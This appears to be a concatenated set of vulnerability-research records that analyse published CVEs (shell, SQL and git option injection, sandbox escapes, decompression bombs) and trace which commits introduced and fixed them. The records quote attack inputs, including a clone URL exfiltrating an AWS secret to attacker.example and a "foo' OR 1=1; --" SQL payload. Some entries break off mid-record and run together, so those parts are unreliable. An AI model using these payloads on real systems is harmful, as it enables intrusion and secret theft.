causal_research.reasoning:
The published advisory describes a real CWE-78 in the separately hosted @signalk/set-system-time plugin that signalk-server ships as a dependency. The smallest first writer of interpolating navigation.datetime into sh -c is 980c22b by named human Teppo Kurki in 2016, with a parent tree that has no index.js and with no commit-object AI markers. Claude later rewrote sudo/BusyBox handling but did not introduce, newly expose, or incompletely remediate this sink. The minimum close is 75b11ea's datetime regex, shipped in npm 1.5.0 and constrained by signalk-server v2.20.0. Therefore the case is a real vulnerability whose BIC is not AI.
Trigger: a client able to write the navigation.datetime path (readwrite/admin credentials, or any client when security is disabled) on a non-Windows host with the set-system-time plugin enabled and not using network time; the value is interpolated unvalidated into a date command line executed via spawn('sh', ['-c', ...]), so shell metacharacters run as the server user (CWE-78, CVSS 3.1 critical). The interpolation and the shell sink originate in the plugin's human-authored initial commit 980c22b (2016-11-02), whose parent 4946980 contains no index.js, and the human fix 75b11eae (KE Gustafsson, 2026-01-11) adds the anchored ISO-8601 allowlist that closes it. Two Claude-authored commits sit between the last prior release and the fix (c467252 'try setting time without sudo first', 7008d7f BusyBox date format): they re-render the same tainted sink and add a second copy of it, but the defect was already reachable in every configuration before them. Probes run for this record show the old passwordless-sudo gate was not a mitigation: under dash (/bin/sh on Debian and Raspberry Pi OS, the plugin's normal platform) 'if sudo -n date &> /dev/null ; then ...' parses as a backgrounded probe plus a redirect-only null command, so the condition is always true and a plain injection payload executes in the then-branch; under a bash-like sh where the gate really fails, a payload that closes the quote and opens its own else branch executes (probe3), and a plain payload executes whenever the probe succeeds. Exposure is therefore identical before and after the AI commits and neither commit is a remediation attempt, so there is no demonstrated AI contribution to the defect: the verdict is NOT_AI on the human 2016 BIC.

causal_research.bug_semantics: The Meteor DDP method autoTranslate.translateMessage takes a client-supplied IMessage and, without Meteor.userId() or canAccessRoomAsync, calls translateMessage(targetLanguage, message). The helper trusts message.rid to load a room and then returns TranslationProviderRegistry.translateMessage(), which always does Messages.findOneById(message._id). After the helper began returning that document, any DDP caller who knew a message _id and any existing room id received the full stored message (private channels, DMs, E2EE rooms). The May 2026 fix authenticates the caller, loads the message by _id on the server, checks room membership, and translates only that server-fetched message.

causal_research.bug_semantics: A contract calls ExecuteReadOnlyWithTypedArguments, which sets runtime.SetReadOnly(true) for a nested dest-context execution and restores the flag afterward. The nested callee can still invoke ManagedDeleteContractWithHost / deleteContract, which builds an indirect call with Function=deleteContract, or an upgrade with Function=upgradeContract. host.execute() dispatches those reserved names to executeDelete/executeUpgrade without consulting runtime.ReadOnly(). executeDelete ends in doExecContractDelete, which after owner/upgradeable permission checks appends the target address to vmOutput.DeletedAccounts; executeUpgrade calls output.DeployCode. PopMergeActiveState merges the child VMOutput into the caller via mergeVMOutputs, concatenating DeletedAccounts. scProcessor.processVMOutput then deleteAccounts() those addresses. Preconditions: the read-only callee passes checkUpgradePermission for the target (owner of an upgradeable/deletable contract). Impact: a call advertised as read-only can commit contract deletion or upgrade, breaking isolation for workflows that treat ExecuteReadOnly as non-mutating. Direct owner delete/upgrade outside read-only mode is intended and not this bug.

causal_research.bug_semantics: Authenticated low-privilege API callers could tell whether a private/ACL translation (or related object) existed by comparing error classes. Screenshot POST /api/screenshots/ resolved Translation.objects.get by project_slug/component_slug/language_code with no access filter, then returned 403 Can not add screenshot when the row existed but screenshot.add failed, versus 400 Translation not found when it did not. Tasks GET/DELETE resolved cached translation_id/component_id with get_object_or_404 then PermissionDenied (403) instead of 404. Component-link POST used Category.objects.get globally and emitted a different validation string when the category belonged to another project. Preconditions: a valid API user (PR:L) who can guess or iterate slugs/IDs; no need for access to the target project. Impact is confidentiality of existence of private translations/components/categories (CWE-203), not content disclosure. The 2020-04 screenshot create used allowed_projects and did not have this oracle; the 2020-10 unfiltered Translation.objects.get introduced it. The 2026-04-27 fix applies filter_access (or project.category_set) so inaccessible objects take the same not-found path as missing ones, while still 403-ing extra permissions (e.g. component.edit) on already-visible objects.

causal_research.bug_semantics: Trigger: attacker-controlled canvas JSON is accepted via loadFromJSON()/fromObject() (collaborative import, CMS, etc.). causal_research.bug_semantics: NodeVM treats require.builtin '*' as allow-all for Node builtin names. From v3 that set is process.binding('natives') / later module.builtinModules, which includes undocumented underscored implementation modules such as _http_client, _http_server, and _tls_wrap. Exclusions are exact-string matches of '-'+name, so builtin: ['*', '-http', '-https', '-net', '-tls', ...] blocks the public wrappers but still addDefaultBuiltin-wraps the underscored siblings. Sandbox code can then require('_http_client').ClientRequest(...) for outbound HTTP or require('_http_server').Server(...).listen(...) to bind a socket, recovering host network capability (SSRF to localhost/metadata/internal services). The 3.11.4 fix removes any name starting with '_' from the wildcard source list.
causal_research.flaw_origin: The smallest first-write is 71604a826120190948a949fcde4e9e39ac167e31 (v3 initial commit, 2016-06-16). Its parent still used a curated public-module allowlist without _http_* names. This commit introduced '*' over all natives plus exact '-'+modulename denial and loaded non-buffer/events natives via host.require, so _http_client was reachable whenever '*' was allowed and -_http_client was not listed. Subsequent Coffee->es6, native->builtin rename, 2020 sandbox overhaul, 2022 resolver rewrite (internal/ filter only), and 2023 lib/builtin.js extraction preserved that exact-name exclusion hole until 436053e30eecbabd487e2fd2959c137ac34e2bb1.

causal_research.bug_semantics: In @better-auth/oauth-provider, /oauth2/token accepts an RFC 8707 resource parameter and checkResource() copies it into the JWT aud claim after checking only the server-wide validAudiences allowlist. /oauth2/authorize never records the requested resource on the authorization code, and oauthRefreshToken has no resources column, so handleAuthorizationCodeGrant and handleRefreshTokenGrant both re-derive audience from the current token-request body. A client that completes a normal authorization (or holds a refresh token issued for one audience) can mint an access token for any other allow-listed resource, bypassing the grant's authorization boundary. RFC 8707 requires recording resources at authorization and allowing only subset narrowing at token/refresh.

causal_research.bug_semantics: A caller passes per-request cookies= into ClientSession._request. Each redirect iteration builds a temporary CookieJar and calls update_cookies(cookies) with the default URL(), so dict cookies have empty domain/path and are treated as shared cookies that filter_cookies() attaches to every host. The loop then constructs ClientRequest with those cookies, emitting a Cookie header on the next hop. On a cross-origin 3xx the client already dropped Authorization, Cookie, and Proxy-Authorization headers (and auth), but it left the cookies parameter bound, so the shared per-request cookies are reapplied to the attacker-controlled origin. Session-jar cookies remain domain-filtered and are not this bug. Impact is confidentiality of whatever the developer put in cookies= when redirects are followed (allow_redirects defaults true).

Python's assert statements are stripped at compile time in optimized mode (python -O / PYTHONOPTIMIZE=1). causal_research.bug_semantics: A victim installs a git: (or git-hosted tarball) dependency, or any other caller of addFilesFromDir. git-fetcher clones the repo, packlists published paths, and asks CAFS to ingest those paths. addFilesFromDir joins each name onto the package directory and uses fs.statSync plus gfs.readFileSync, which follow symlinks, then stores the target bytes in the content-addressable store and later hardlinks them into node_modules as regular files. There is no realpath/is-subdir check, so a package symlink to /etc/passwd or ~/.ssh/id_rsa is copied rather than skipped. Preconditions: untrusted file:/git contents (registry tarballs are out of scope). After b277b45, symlink targets outside the canonical package root are skipped.

causal_research.bug_semantics: An authenticated client with ReadMessageHistory calls GET /channels/<id>/messages with nearby=<message id> and limit=1 (validator minimum). message_query.rs forwards that limit into MongoDb::fetch_messages Relative { nearby }. The older-side query used FindOptions.limit(limit / 2), which is 0 for limit=1. MongoDB treats limit 0 as no limit, so the older half of the nearby fetch returns the entire preceding channel history in one request. Repeating that request in parallel exhausts database and API resources (availability). Confidentiality is not the core issue: the caller already has history permission and could paginate. CVE text claiming an unauthenticated attacker is inconsistent with the User request guard, which rejects missing session/bot token with 401.

mechanism.counterevidence: Three ways the claim could have failed were checked: (a) can the attacker send limit=0 directly? No, `range(min = 1, max = 100)` rejects it, but limit=1 produces the same zero through `limit / 2`; (b) did the newer-side branch share the defect? No, `.limit(limit / 2 + 1)` is at least 1 for any validated limit; (c) is the default (no nearby) path affected? No, it issues a single `.limit(limit)` with the validated limit. The server-side reading "limit 0 = no limit" comes from the advisory details and is corroborated by the fix, whose sole purpose is to guarantee that the value sent is at least 1; the mongodb 2.2.2 driver source is absent from the local cargo registry and MongoDB wire semantics are outside the allowed web sources, so that one link was not independently reopened.
mechanism.impact: One request returns the entire older-side history of the channel in a single response, deserialized into `Message` documents and serialized to JSON; repeating such requests in parallel drives resource exhaustion on the database and the delta process, i.e. denial of service (CVSS v4 VA:H per the advisory).
mechanism.preconditions: A MongoDB-backed deployment (`DatabaseInfo::MongoDb`, the production driver) on a channel whose older-side history is large, and a requester holding a valid rauth session (2021) or session / x-bot-token (HEAD) plus channel read permission; at the fix-era route the guards are the `User` FromRequest and `throw_if_lacking_channel_permission(ChannelPermission::ReadMessageHistory)`.
mechanism.summary: A nearby message query with the minimum validated limit of 1 makes the older-side MongoDB find use `limit / 2 = 0`; the database treats a zero limit as no limit, so a single request fetches the channel's whole older-side message history and concurrent requests exhaust server memory and CPU (denial of service).
mechanism.trigger: GET /channels/<channel_id>/messages?nearby=<26-character message id>&limit=1, sent by an authenticated account that holds channel read / message-history permission; `limit=1` is the smallest value that passes the route's `validate(range(min = 1, max = 100))` on `OptionsQueryMessages::limit`.
mechanism.vulnerable_code: crates/core/database/src/models/messages/ops/mongodb.rs:98 in `AbstractMessages::fetch_with_users` (pre-fix blob 18eeb3796df46e81e89f167dde353228b0a0e97d, parent of the fix 5f84daa9): older branch `.limit(limit / 2)`, whose origin is src/routes/channels/message_query.rs:85 in a4c227ce41f7584bf3f6589c8512eeb827ea400c, introduced next to the newer branch `.limit(limit / 2 + 1)`.

causal_research.reasoning:
The nearby older-query limit/2 zero-means-unlimited MongoDB behavior is a real availability defect, confirmed in vendor GHSA-h7h6, CVE-2025-71377, and the 20241227-2 tree, and closed by 5f84daa in 20250210-1 (0.8.2). The smallest first writer of that mechanism is a4c227ce (2021), whose parent lacks nearby entirely; later mongodb.rs code is a relocation. The BIC commit object is named-human Paul/insertish with no AI marker, so the verdict is NOT_AI rather than an AI class. CVE unauthenticated wording is wrong but does not make the advisory a false positive.
The advisory defect is real and code-verifiable: with `nearby` set and `limit=1`, the minimum admitted by the route validator, the older-side find in `AbstractMessages::fetch_with_users` is issued with `limit / 2 = 0`, and a find limit of zero is treated as no limit, so one request reads the channel's entire older-side history and parallel requests exhaust server resources. The defect enters the tree in a single atomic 2021 commit, a4c227ce41f7584bf3f6589c8512eeb827ea400c ("Add \"nearby\" message query."), whose immediate parent edd8ef8a1d4499089a3a4505a46d8634cbd45001 has no nearby option and only a single bounded find; the asymmetric pair `.limit(limit / 2 + 1)` on the newer side and `.limit(limit / 2)` on the older side is created there. Repo-level AI activity, the later fix's authorship and changelogs were not used as attribution evidence. causal_research.bug_semantics: Code injection (CWE-94) when generating Java specific classes from untrusted Avro schemas. The Velocity template lang/java/compiler/src/main/velocity/org/apache/avro/compiler/specific/templates/java/classic/record.vm (and enum.vm) interpolates attacker-controlled schema/field '[doc]' text RAW into the generated Java source inside Javadoc comments: '/** $schema.getDoc() */' and '/** $field.doc() */'. A schema doc containing '*/' closes the Javadoc comment early and the remainder of the doc text is emitted as Java code, so compiling generated classes from an untrusted schema yields arbitrary code injection into the generated source (which downstream tooling compiles). Affects avro-compiler 0-1.11.5 and 1.12.0; fixed 1.11.5/1.12.1.

causal_research.bug_semantics: Repo.clone_from()/Repo._clone() treat the caller-supplied remote URL as a git clone argument, but first run it through Git.polish_url(). On non-Cygwin platforms polish_url() called os.path.expandvars() (and then expanduser for a leading ~) with no scheme check or opt-out. An attacker who can supply a clone URL such as https://attacker.example/steal/${AWS_SECRET_ACCESS_KEY}/repo.git causes the hosting process environment to be interpolated into the URL; git clone then transmits that secret to the attacker-controlled host. Protocol filtering ran on the pre-expansion string, so the value Git received could also differ from the checked URL.

causal_research.bug_semantics: Public safe openssl::aes::unwrap_key (RFC 3394 AES key unwrap) is supposed to require out.len() >= in_.len()-8 because OpenSSL AES_unwrap_key writes inlen-8 bytes through the out pointer. After 1c3f5b5f the pre-FFI guard is assert!(out.len()+8 <= in_.len()), i.e. out.len() <= in_.len()-8. A caller (or attacker controlling buffer sizes) who passes a shorter out satisfies the assert; the subsequent unsafe ffi::AES_unwrap_key then writes past the end of out by in_.len()-8-out.len() bytes (CWE-787). Exact-size buffers still work; larger buffers are wrongly rejected. wrap_key in the same function pair uses the correct direction (>=). Parent equality assert!(in_.len() == out.len()+8) would have panicked on the undersized case, so the OOB is the inverted inequality, not the original API addition.

causal_research.bug_semantics: When urllib3 follows an HTTP redirect it must discard the 3xx body so the pooled connection can be reused. From 1.22 that drain is implemented by a full HTTPResponse.read() (later HTTPResponse.drain_conn -> self.read()). read() defaults to decode_content=True, and with amt=None it decompresses the entire body with max_length=-1. Callers using the streaming API (preload_content=False) have not yet started decoding; _has_decoded_content is still False, so this drain is the first (and complete) decode. Streaming-chunk safeguards added in 2.6.0 only bound decompression when amt is set, so they do not apply. A malicious redirect with Content-Encoding gzip/deflate/br/zstd can therefore force unbounded CPU and memory amplification (CWE-409) before the caller reads anything. Preconditions: urllib3 >=1.22,<2.6.3, redirects enabled, preload_content=False, untrusted server. Default preload_content=True already fully reads/decodes at construction, so the extra drain is a no-op there; redirect=False avoids the path.

mechanism.counterevidence: Checked that the drain really decodes: read() maps decode_content=None to self.decode_content, whose constructor default is True, and _decode decompresses the whole amt=None body (verified at 796051229 and at the fix parent 70cecb27). mechanism.impact: Client-side denial of service: high CPU usage and large memory allocations for decompressed data from a small wire payload (CWE-409, decompression bomb). The advisory's CVSS rates availability high with no confidentiality or integrity impact.
mechanism.preconditions: preload_content=False (with preload_content=True the body is read and decoded eagerly by design); redirects not disabled (redirect=False is the documented mitigation); a 3xx response with Location; a compressed body whose decompressed size is attacker-chosen. Application-level chunked read limits cannot help because the drain calls read() with amt=None before the application ever sees the response.
mechanism.summary: When urllib3 follows an HTTP redirect for a streaming (preload_content=False) request, the redirect handler drains the intermediate response with HTTPResponse.read() called with no arguments; read() resolves decode_content from the response default (True) and decodes the whole body with amt=None, so a small compressed redirect body expands fully in CPU and memory before the caller reads anything.
mechanism.trigger: An application calls urlopen/request with preload_content=False (streaming) and does not disable redirects; the server (or a MITM that can answer the request) replies to the initial URL with a 3xx status plus Location and a body carrying Content-Encoding: gzip or deflate (br/zstd too when the optional decoder is installed), with a decompressed size of the attacker's choosing.
mechanism.vulnerable_code: src/urllib3/response.py:793-802 drain_conn in the fix parent tree 70cecb27 (same body as 2.6.2), which calls self.read() with amt=None and decode_content resolving to self.decode_content=True; reached from src/urllib3/poolmanager.py:502 (PoolManager redirect, which sets kw['redirect']=False for the pool call) and src/urllib3/connectionpool.py:907 (pool-level redirect). causal_research.reasoning:
The advisory is a real published CWE-409: redirect drain performed an unbounded decoded read of a streaming response. Parent-tree verification and PR #1174 decomposition identify the smallest introducer as 79605122, a 2017 named-human commit with no commit-object AI marker. The minimum public fix is 8864ac4, present in 2.6.3 and absent from 2.6.2, which stops drain decoding unless decoding was already started; that matches the documented preload_content=False redirect case. Fix-side GitHub-committer identity is not BIC attribution. Therefore the closed verdict is NOT_AI.
The advisory describes a decompression-bomb bypass: with preload_content=False and redirects enabled, urllib3 drained each redirect response by calling HTTPResponse.read() with no arguments, which resolves decode_content to the response default True and decodes the entire body before the caller reads anything or can bound it. The vulnerable behaviour first appears in 796051229 ('Drain and release the connection before recursing in retry/redirect. This fixes deadlocks with block=True.'), whose immediate parent 6d1050064 contains no read() call at all in connectionpool.py; the commit's first release tag is 1.22, matching the advisory's introduced range. The fix 8864ac40 (first released in 2.6.3) changes drain_conn to read(decode_content=self._has_decoded_content), which is False on every redirect hop, so the drain still discards the on-wire bytes but no longer decompresses them. The BIC commit object is a 2017 human contribution: author and committer Matt Billenstein <matt@vazor.com>, a plain deadlock-fix message, no AI-assistant trailers and no machine-shaped attribution. causal_research.bug_semantics: Kestrel HTTP/3 treats inbound QPACK encoder (stream type 2) and decoder (stream type 3) control streams as must-accept no-ops. ProcessRequestAsync dispatches those types to HandleEncodingDecodingTask, which (before the fix) looped while (_isClosed == 0), calling PipeReader.ReadAsync and AdvanceTo(End) without testing result.IsCompleted. Unlike HandleControlStream in the same class, that loop never exits on FIN. OnClosed was registered only for outbound control sends and after inbound SETTINGS, so encoder/decoder FIN never set _isClosed. After the QUIC STREAM FIN, the pipe is complete and subsequent ReadAsync returns immediately, spinning a thread at 100% CPU (CWE-400). PoC: complete a QUIC handshake, then send stream_id=6 fin_bit=1 empty encoder payload.

+    def polish_url(cls, url: str, is_cygwin: Union[None, bool] = None, expand_vars: bool = True) -> PathLike:
         """Remove any backslashes from URLs to be written in config files.
 
         Windows might create config files containing paths with backslashes, but git
         stops liking them as it will escape the backslashes. Hence we undo the escaping
         just to be sure.

+            Expand environment variables and an initial ``~``. Disable this for values
+            obtained from an untrusted source, such as remote URLs.

         if is_cygwin is None:

+                    url = os.path.expanduser(url)

steps.detail: The hardening pass that removed expansion from clone URLs added an expand_vars switch to the shared URL helper and turned it off only on the clone path, leaving the permissive default in place for every other caller.
steps.title: AI change

steps.detail: The completing change passes expand_vars=False from the remote creation and submodule add call sites, so those stored URLs keep their literal ${...} text instead of carrying substituted secrets.
steps.title: Fix

code_evidence.summary: An AI-assisted change stopped environment expansion on clone URLs but left the same expansion in the remote and submodule callers, so a URL passed to create_remote or add could embed the hosting process's secrets and carry them to the attacker's host.

attempted_remediation.changed: Added an expand_vars switch to polish_url and opted the clone path out of expansion (the clone URL and the stored origin are passed with expand_vars=False).
attempted_remediation.missed: Left the remote path on the expanding default: git/remote.py still called Git.polish_url(url), so Remote.add() and Repo.create_remote() expanded environment variables.

final_closure.closed: Flipped the two remaining callers, git/remote.py and git/objects/submodule/base.py, to polish_url(url, expand_vars=False).

ir_chain.original_mechanism: Git.polish_url() ran os.path.expandvars() over every URL it was handed, so a caller-supplied clone URL carrying $NAME or ${NAME} tokens had the hosting process's environment expanded into it.
ir_chain.original_sink: Git.polish_url() in git/cmd.py, reached from Repo.clone_from()
ir_chain.residual_bypass: A remote URL added through Remote.add() or Repo.create_remote() still had environment variables expanded into it, so a hosting-process secret could be sent to the attacker-named host.

causal_research.bug_semantics: Authenticated callers (MCP session / shared AUTH_TOKEN, including prompt-injected tool args) can make n8n-mcp issue HTTP(S) requests and return the response body. Three surfaces share one broken control: (1) webhook/chat/form trigger URLs pass SSRFProtection.validateWebhookUrl, which resolves DNS once and checks private/metadata ranges, then axios connects by hostname and looks up DNS again (CWE-367 DNS rebinding TOCTOU / CWE-918); (2) N8nApiClient uses operator N8N_API_URL with no SSRF gate on constructor, interceptors, healthz, or version fetch; (3) multi-tenant x-n8n-url supplies a per-request API base URL into that same client. Pre-2.50.2 the gate therefore does not bind the validated IP to the transport, so a hostname that is public at check time can be internal at use time, and API-client URLs were not gated at all.

causal_research.bug_semantics: GET /api/bank-account is reachable by any authenticated API user. The route uses only middleware(['auth:api']); BankAccountListController::index() then loads every Bank\Account row for Auth::user()->company_id, eager-loads bank/country, and returns the collection (IBAN, SWIFT/BIC, identifiers). A low-privileged company user with a bearer token therefore reads banking records they are not authorized to see.

causal_research.bug_semantics: vLLM Idefics3/SmolVLM serving accepts a user image and runs it through HuggingFace Idefics3ImageProcessor without forcing channels_last. A 1x1 RGB array has shape (1,1,3), which transformers treats as an ambiguous channel dimension and infers CHW. vLLM independently computes num_patches from PIL width/height (a 1x1 image is rescaled to the processor longest_edge, typically 4x4 tiles plus a global patch = 17). The processor instead emits a different patch tensor (advisory: size 9). At inference, `_process_image_input` does image_features.split(num_patches.tolist()); PyTorch raises RuntimeError because split sizes do not sum to the tensor's dim-0, and that unhandled exception kills EngineCore (DoS). The same missing-format call existed from the original Idefics3 mapper; later multimodal-processor refactors preserved the omission and eventually placed the fatal split at idefics3.py:672.

causal_research.bug_semantics: urllib3 2.6.0 introduced partial (bounded) decompression in the streaming API, but two paths could still decompress an entire response instead of the requested portion: (1) the second HTTPResponse.read(amt=N) call on a Brotli(br)-encoded response when the official brotli package lacks output_buffer_limit (has_unconsumed_tail forces full decode of the buffered tail); (2) HTTPResponse.drain_conn() after decompression already started, because drain_conn called read() with decode_content=self._has_decoded_content, decoding all remaining compressed bytes in one operation. Result: client-side decompression bomb (CWE-409, high CPU/memory) from a small compressed body.
causal_research.evidence: Advisory GHSA-mf9v-mfxr-j63j (github-reviewed 2026-05-11, CVE-2026-44432): introduced 2.6.0, fixed 2.7.0; two sinks: 2nd read(amt) on br with official brotli, and drain_conn after partial decompression. Introducer c19571de (author Illia Volochii, committer GitHub, 2025-12-05; single-parent squash 'Merge commit from fork') first added max_length to all decoders, has_unconsumed_tail properties, the read(amt) tail-decoding branch in src/urllib3/response.py, and kept drain_conn calling self.read(decode_content=self._has_decoded_content). Parent 816fcf04 (2.5.0-era) has zero occurrences of max_length/has_unconsumed_tail in response.py and drain_conn was plain self.read() with no decode_content flag semantics tied to partial decode - vulnerable behavior absent in parent. 2.5.0 tag response.py also has 0 hits for max_length|has_unconsumed_tail. Fix 2bdcc44d (author Illia Volochii, 2026-05-07, squash of PR: 'Avoid any decoding in HTTPResponse.drain_conn' and 'Fix full decompression on the 2nd small read from response using Brotli') changes drain_conn to self._raw_read() plus decoder cleanup, and adds 'and len(self._decoded_buffer) < amt' guard to the has_unconsumed_tail branch; it is an ancestor of tag 2.7.0 (9a950b92 Release 2.7.0). causal_research.bug_semantics: PdoAdapter::doClear interpolates its $namespace argument into DELETE ... LIKE '$namespace%' and runs it with PDO::exec. Until 4.4, clear() passed only the constructor-validated adapter namespace, so quotes and LIKE metacharacters could not appear. ad6f6cf added AdapterInterface::clear($prefix) and concatenated the unsanitized prefix onto that namespace in the non-versioning path (default). A caller who can pass a prefix containing ' or % can break out of the LIKE literal, change deletion scope, or otherwise alter the statement. The 2026 fix rejects prefixes outside [-+.A-Za-z0-9] before SQL, matching the existing namespace charset.

mechanism.impact: CWE-89 SQL injection: the prefix can terminate the string literal and inject SQL into the DELETE statement - `OR 1=1` widens the deletion to every row of the shared cache table (cross-namespace / cross-tenant cache wipe), and additional clauses or stacked statements are possible where the PDO driver permits them. Integrity and availability of unrelated cached data are lost; no read path is disclosed by this statement, but tampering with the WHERE clause can also target specific rows.
mechanism.preconditions: An attacker-influenced prefix reaching `clear($prefix)`; a SQL-backed adapter (PdoAdapter, DoctrineDbalAdapter) sharing one cache table across namespaces; the versioning path is not taken (the versioning branch ignores the prefix). The pool constructor already validates `$namespace` ('InvalidArgumentException when namespace contains invalid characters') but nothing validated `$prefix` before the fix.
mechanism.summary: `clear($prefix)` forwards a caller-supplied prefix that `AbstractAdapterTrait::clear()` concatenates onto the pool namespace (`$this->namespace.$prefix`) and SQL-backed adapters interpolate into a single-quoted `LIKE '<namespace>%'` pattern run with `PDO::exec()`, so a quote in the prefix escapes the literal and reshapes the DELETE (advisory payload `foo' OR 1=1; --`).
mechanism.trigger: Any code path that passes an untrusted or attacker-influenced string as the `$prefix` argument of a cache pool's `clear()` on a SQL-backed pool. The prefix-clearing feature (ad6f6cf9) made prefixes first-class and Symfony's own implementations forward caller input, e.g. `ProxyAdapter::clear()` does `$this->pool->clear($this->namespace.$prefix)`; for PdoAdapter/DoctrineDbalAdapter the prefix reaches `doClear()` unchanged.

The advisory is a real CWE-89 in the non-versioning PdoAdapter clear($prefix) path: unsanitized prefix is concatenated into a LIKE literal executed via PDO::exec. That prefix path did not exist until ad6f6cf (named human, no commit-object AI marker); the 2016 interpolation was gated by constructor namespace validation and a prefix-less clear(). The minimum fix is ec50b799, also Nicolas Grekas without AI trailers, present in the claimed patched tags and absent from the prior ones. Fix-side AI is informational only. Therefore the case is a real vulnerability with a named-human BIC and is NOT_AI.
The SQL injection is real and was introduced by the `$prefix` argument added to `AdapterInterface::clear()` in ad6f6cf9, whose immediate parent 835f6b03 still has `public function clear()` without the parameter and calls `doClear($this->namespace)`; the child concatenates the caller-supplied prefix: `doClear($this->namespace.$prefix)`. causal_research.bug_semantics: DeleteReleaseOfRepoByID (originally DeleteReleaseByID) shells out to git tag -d with the stored release tag name as a trailing argv and without an end-of-options separator. Git therefore treats a tag beginning with '-' as a flag rather than a name, so deletion can fail, operate on the wrong options, or otherwise disrupt release cleanup. Creation-path TrimLeft/TrimPrefix of leading dashes does not cover tags introduced by git push or other ref updates. The 0.14.2 fix switches that sink to git-module DeleteTag, which always inserts --end-of-options before the name.

causal_research.bug_semantics: A crafted HDF-EOS swath/grid file can supply a DimList metadata value that is empty or shorter than two characters. SWfinfo (frmts/hdf4/hdf-eos/SWapi.c) copies that value into a 512-byte heap buffer utlstr via EHgetmetavalue, then unconditionally does memmove(utlstr, utlstr+1, strlen(utlstr)-2) and utlstr[strlen(utlstr)-2]=0 to strip assumed surrounding parentheses. strlen returns size_t, so a length < 2 underflows the copy size to SIZE_MAX-1 and memmove reads far past the allocation. The path is reachable from gdalmdiminfo through HDF4SwathSubGroup::OpenMDArray -> SWfieldinfo -> SWfinfo (ASan: READ of size 18446744073709551614). Impact is local denial of service (CWE-125). The same unguarded paren-strip existed in GDapi.c GDfieldinfo and was closed in the same patch (#14379).

causal_research.bug_semantics: Unauthenticated POST to a Next.js App Router Server Function (Next-Action / multipart form) is deserialized by vendored React Flight decodeReply/decodeReplyFromBusboy. Token $K<id> reconstructs nested FormData by scanning the entire backing FormData for keys starting with prefix+id+"_". That prefix is collidable across ids and nested keys, and the scan/copy is unbounded, so a small crafted multipart body causes excessive CPU and heap (CWE-400/770; CWE-502). The May 2026 fix inserts a delimiter (prefix+"_"+id+"_") and walks a BackingFormData keyPointer instead of rescoring all keys.

causal_research.bug_semantics: VM2 wraps host/sandbox values in Proxies whose handlers live in the host realm. Node's util.inspect with showProxy:true unwraps those Proxies and records the raw handler on the inspect context (this.seen). causal_research.bug_semantics: Unauthenticated POST /api/login accepts JSON credentials with no request-body or password-length bound. loginHandler forwards the raw body to the configured Auther; JSONAuth.Auth decodes the entire password string into memory and passes it to users.CheckPwd, which calls bcrypt.CompareHashAndPassword on that unbounded input. A gigabyte-scale password (as in the advisory PoC) forces large JSON decode/memory allocation and expensive hashing, exhausting CPU/RAM and denying service. The same missing bound also applied to signup JSON. The 2026 fix wraps login and signup bodies with http.MaxBytesReader at 1 MiB before decode.

causal_research.bug_semantics: GitPython builds a real git argv from caller values: transform_kwargs/dashify turns kwargs such as exec/upload_pack into --exec=/--upload-pack= and inserts them before any '--', while some positionals are also placed before '--'. Exploitation requires an embedding app that forwards attacker-controlled options or revision strings into these APIs.

evidence: GitPython builds a real git argv from caller values: transform_kwargs/dashify turns kwargs such as exec/upload_pack into --exec=/--upload-pack= and inserts them before any '--', while some positionals are also placed before '--'. Repo.archive() forwards **kwargs into git archive, so {remote:'.', exec:'<cmd>'} becomes git archive --remote=. --exec=<cmd> -- <treeish> and git-upload-archive runs the attacker helper under default config (no protocol.ext.allow). repo.git.ls_remote() had no dedicated wrapper before 3.1.51, so the same dynamic builder turns upload_pack='<cmd>' into --upload-pack=<cmd>. Repo.iter_commits()/Commit.iter_items() and Repo.blame() pass caller rev before '--' with no leading-dash check, so rev='--output=/path' is honoured by git rev-list/blame and truncates that file before revision parsing fails. Exploitation requires an embedding app that forwards attacker-controlled options or revision strings into these APIs.

causal_research.bug_semantics: SQL injection (CWE-89) in LangGraph's SQLite checkpoint store (libs/checkpoint-sqlite/langgraph/store/sqlite/base.py, BaseSqliteStore/SqliteStore): filter keys passed to store search/list_namespaces operations were interpolated directly into SQL via string concatenation - e.g. json_extract(value, '$.' + key + '...') in _get_filter_condition and the filter loop - without validation or parameterization of the key. Because filter keys are also used for JSON-pointer-style path extraction with a trailing '.0' suffix appended, crafted keys can escape the json_extract path literal, inject arbitrary SQL, and bypass access controls (namespace/filter restrictions). Fixed by _validate_filter_key() enforcing ^[a-zA-Z0-9_.-]+$ on every filter key before query construction.
causal_research.evidence: Advisory CVE-2025-64104 = GHSA-7p73-8jqx-23r8 = PYSEC-2026-1529 ('LangGraph SQLite Checkpoint Filter Key SQL Injection POC for SqliteStore', modified 2026-08-12): prior to 2.0.11, LangGraph's SQLite store uses direct string concatenation without proper parameterization, allowing arbitrary SQL injection and access-control bypass; fixed in 2.0.11; FIX ref github.com/langchain-ai/langgraph/commit/bc9d45b476101e441cb1cc602dea03eb29232de4; GIT range introduced:0 -> fixed:bc9d45b4. class_id verified: sha256('CVE-2025-64104\nGHSA-7p73-8jqx-23r8\n')[:24] = 1ed7ad6267c0bd77bb27da57 (2-id set, excludes PYSEC member). Fix trace: bc9d45b476101e441cb1cc602dea03eb29232de4 ('fix(checkpoint-sqlite): add validation to filter keys in sql store (#5666)', 2025-07-25, Eugene Yurtsev) adds _validate_filter_key() (regex ^[a-zA-Z0-9_.-]+$) and calls it in the store filter loop (base.py ~line 393) and in both _get_filter_condition overrides (SqliteStore + BaseSqliteStore), plus 20 lines of tests; tag checkpointsqlite==2.0.11 contains the fix (git tag --contains), matching the advisory fixed version. Introducer: 025b634d9815a9582f99fc0e62c7a0c5e003b093 ('SqliteStore (#3608)', 2025-05-17, William FH) added libs/checkpoint-sqlite/langgraph/store/sqlite/base.py (1725 lines) whose filter logic concatenates 'json_extract(value, "$.' + key + '"...' strings directly (lines ~389-415 and _get_filter_condition ~594+); immediate parent 8edb3e7b654241d89bfa69262a7d5b48306da5ac has no libs/checkpoint-sqlite/langgraph/store/ directory (git ls-tree exit non-zero) and no 'json_extract(value' match in the store path (git grep exit 1); json_extract appears at parent only in pre-existing checkpoint utils/tests, not in a store. SQL fragments (values were bound as parameters, keys were not), which allowed crafted keys to inject SQL and bypass access controls. The flaw was introduced human-authored and fixed ~2 months later (2025-07-25) by the same team with a validation regex.

